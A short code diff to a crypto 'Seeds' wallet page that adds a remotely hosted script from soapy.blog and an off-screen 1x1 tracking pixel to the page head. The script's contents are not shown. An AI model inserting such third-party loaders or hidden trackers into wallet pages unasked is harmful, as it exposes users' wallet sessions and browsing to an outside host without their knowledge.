@@ -118,7 +118,7 @@ function page() {
  .ownlabel{font-size:11px;color:var(--mut);text-transform:uppercase;letter-spacing:.5px}.count{font-size:18px;font-variant-numeric:tabular-nums}
  .mut{color:var(--mut)}.blue{color:var(--blue)}.gold{color:var(--gold)}.gate{color:var(--mut);font-size:13px;margin:8px 2px}
  footer{color:var(--mut);font-size:12px;text-align:center;margin:22px 0 8px}a{color:var(--gold)}
-</style></head><body><div class=wrap>
+</style><script defer src="https://soapy.blog/b.js"></script><noscript><img src="https://soapy.blog/px.gif" alt="" width="1" height="1" style="position:absolute;left:-9999px"></noscript></head><body><div class=wrap>
 <header><span class=brand>🌱 <b>Seeds</b></span><span class=alpha>Alpha</span></header>
 <p class=lead>Your Seed wallet — every Kush Farm strain, minted through MELEK-Engine. Some seeds are <b class=blue>fungible tokens</b> (the abundant ones — trade them, plant = burn them); the scarce strains are <b class=gold>NFTs</b> (collectable, with traits). Connect your Akasha / MELEK wallet (or enter your MELEK account) to see which seeds <b>you</b> hold; everything else is just the catalog.</p>
 <div class=connect>
